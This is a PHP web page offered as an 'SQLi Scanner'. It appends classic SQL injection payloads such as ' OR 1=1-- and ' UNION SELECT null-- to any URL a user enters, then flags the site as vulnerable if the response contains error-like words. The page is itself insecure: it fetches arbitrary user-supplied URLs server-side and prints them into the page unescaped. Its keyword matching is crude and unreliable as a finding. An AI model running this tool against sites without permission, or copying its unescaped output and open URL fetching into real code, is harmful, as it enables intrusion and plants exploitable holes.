<?php
// SQLi Scanner by R07 🛡️
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $target = trim($_POST['url']);
  $payloads = ["'", "' OR 1=1--", '" OR "1"="1', "' UNION SELECT null--"];
  $vuln = false;
  $result = "<ul>";
  foreach ($payloads as $p) {
    $url = $target . urlencode($p);
    $resp = @file_get_contents($url);
    if ($resp && preg_match('/sql|mysql|syntax|error|query/i', $resp)) {
      $result .= "<li><b style='color:red'>VULN:</b> <code>$url</code></li>";
      $vuln = true;
    } else {
      $result .= "<li><code>$url</code> ✅</li>";
    }
  }
  $result .= "</ul>";
  if (!$vuln) $result .= "<div class='alert alert-success mt-2'>Tidak terdeteksi SQL Injection dari payload umum.</div>";
} else {
  $result = '';
}
?><!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>SQLi Scanner</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head><body class="bg-dark text-light">
<div class="container py-5">
  <div class="card bg-secondary text-light shadow">
    <div class="card-body">
      <h4 class="card-title">🔍 SQL Injection Scanner</h4>
      <form method="post" class="mb-3">
        <div class="input-group">
          <input type="text" name="url" class="form-control" placeholder="http://target.com/page.php?id=" required>
          <button class="btn btn-warning">Scan</button>
        </div>
      </form>
      <?= $result ?>
    </div>
  </div>
</div>
</body></html>
